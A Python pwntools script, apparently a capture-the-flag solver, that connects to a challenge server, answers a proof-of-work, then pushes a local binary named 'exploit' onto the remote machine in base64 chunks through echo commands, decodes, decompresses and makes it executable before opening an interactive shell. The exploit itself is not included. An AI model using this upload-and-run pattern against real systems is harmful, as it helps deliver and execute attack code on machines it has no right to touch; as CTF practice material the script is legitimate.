#!/usr/bin/python3
from pwn import *
from subprocess import check_output

def solve_pow():
    p.recvuntil("Send the output of: ")
    command = p.recvline().strip()
    result = check_output(command.split(b" "))
    p.sendline(result)

def send_command(cmd, print_cmd = True, print_resp = False):
    if print_cmd:
        log.info(cmd)

    p.sendlineafter("$", cmd)
    resp = p.recvuntil("$")

    if print_resp:
        log.info(resp)

    p.unrecv("$")
    return resp

def send_file(name):
    file = read(name)
    f = b64e(file)


    send_command("touch /home/ctf/a.gz.b64")
    size = 800
    for i in range(len(f)//size + 1):
        log.info("Sending chunk {}/{}".format(i, len(f)//size))
        send_command("echo -n '{}'>>/home/ctf/a.gz.b64".format(f[i*size:(i+1)*size]), False)

    send_command("cat /home/ctf/a.gz.b64 | base64 -d > /home/ctf/a.gz")
    send_command("gzip -d /home/ctf/a.gz")
    send_command("chmod +x /home/ctf/a")
    send_command("mv /home/ctf/a /home/ctf/exploit")
    p.interactive()

def exploit():
    send_file("exploit.gz")

if __name__ == "__main__":

    #context.log_level = 'debug'
    #p = remote("your_server", 10101)
    p = remote("ctf.k3rn3l4rmy.com", 1003)
    solve_pow()
    p.newline = b'\r\n'
    exploit()
